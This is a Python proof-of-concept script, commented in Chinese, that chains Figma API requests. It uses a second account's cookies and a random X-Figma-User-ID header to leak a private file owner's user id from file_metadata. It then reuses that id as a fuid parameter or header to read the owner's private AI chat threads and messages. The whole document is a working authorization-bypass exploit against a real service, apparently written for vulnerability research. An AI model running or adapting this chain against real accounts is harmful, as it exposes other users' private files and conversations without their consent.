# -*- coding: utf-8 -*-
"""最终闭环: 零知识攻击链
Step1: B cookie + X-UID=随机(无需知道任何uid) → file_metadata 200 → 提取 owner uid (current_team_user.user_id)
Step2: B cookie + fuid=Step1提取的uid → AI threads/messages 全系列 200 → 读取私有文件 AI 对话
Step3: B cookie + X-UID=Step1提取的uid → AI 接口同样 200 (双路径)
"""
import io, json, sys, urllib.error, urllib.parse, urllib.request
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

BASE = "https://www.figma.com"
A_DESIGN = "5Gs4PaTz11Hlk2sqVnidBG"   # A 的私有 design 文件
A_MAKE = "5zb5YkoxMa09KpqOyuLcHD"     # A 的 Weave 文件 (已私有化)
A_THREAD = "ee5997d9-bbdb-4912-9587-9022c14c0be0"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/151.0.0.0 Safari/537.36"
BC = io.open('ws_cookie_B_new.txt', encoding='utf-8').read().strip().replace('\n', '; ')


def req(label, path, query=None, xuid=None, extract=None):
    headers = {"User-Agent": UA, "Accept": "application/json", "Origin": BASE,
               "Referer": BASE + "/", "Cookie": BC}
    if xuid is not None:
        headers["X-Figma-User-ID"] = str(xuid)
    url = BASE + path
    if query:
        url += "?" + urllib.parse.urlencode(query)
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=headers), timeout=25)
        raw = r.read().decode(errors='replace')
        status = r.status
    except urllib.error.HTTPError as e:
        raw = e.read().decode(errors='replace')
        status = e.code
    print(f"[{label}] HTTP {status} {raw[:180]}")
    if status == 200 and extract:
        try:
            return json.loads(raw), status
        except Exception:
            return None, status
    return None, status


print("=========== Step 1: X-UID=随机值 → file_metadata (design 文件) ===========")
j, s = req("file_metadata design", "/api/file_metadata/" + A_DESIGN,
           xuid="99999999999999999999", extract=True)
leaked_uid = None
if j:
    meta = j.get("meta", {})
    ctu = meta.get("current_team_user") or {}
    leaked_uid = ctu.get("user_id")
    print("current_team_user keys:", list(ctu.keys())[:20])
    print(">>> LEAKED OWNER UID:", leaked_uid)
    print("meta keys:", list(meta.keys())[:30])

print("\n=========== Step 1b: X-UID=随机值 → file_metadata (make 文件, 已私有化) ===========")
j2, s2 = req("file_metadata make", "/api/file_metadata/" + A_MAKE,
             xuid="99999999999999999999", extract=True)
if j2:
    ctu2 = (j2.get("meta") or {}).get("current_team_user") or {}
    print(">>> make 文件 LEAKED OWNER UID:", ctu2.get("user_id"))

if not leaked_uid:
    print("\n!!! file_metadata 未泄露 uid, 链断裂 - 需要外部已知 uid")
    sys.exit(0)

print("\n=========== Step 2: fuid=泄露的owner uid → AI 接口 ===========")
req("threads", "/api/ai_chat/threads",
    {"owner_id": A_DESIGN, "owner_type": "file", "fuid": leaked_uid})
req("messages", f"/api/ai_chat/messages/{A_THREAD}",
    {"owner_id": A_DESIGN, "owner_type": "file", "fuid": leaked_uid})

print("\n=========== Step 3: X-UID=泄露的owner uid → AI 接口 (header 路径) ===========")
req("threads (X-UID)", "/api/ai_chat/threads",
    {"owner_id": A_DESIGN, "owner_type": "file"}, xuid=leaked_uid)
req("messages (X-UID)", f"/api/ai_chat/messages/{A_THREAD}",
    {"owner_id": A_DESIGN, "owner_type": "file"}, xuid=leaked_uid)

print("\n=========== Step 4: make 文件 (已私有化) 同链 ===========")
req("make threads", "/api/ai_chat/threads",
    {"owner_id": A_MAKE, "owner_type": "file", "fuid": leaked_uid})

print("\n=========== Step 5: realtime_token (B 无权限时 403 对照) ===========")
req("realtime_token 注入", "/api/files/" + A_DESIGN + "/realtime_token",
    {"fuid": leaked_uid})
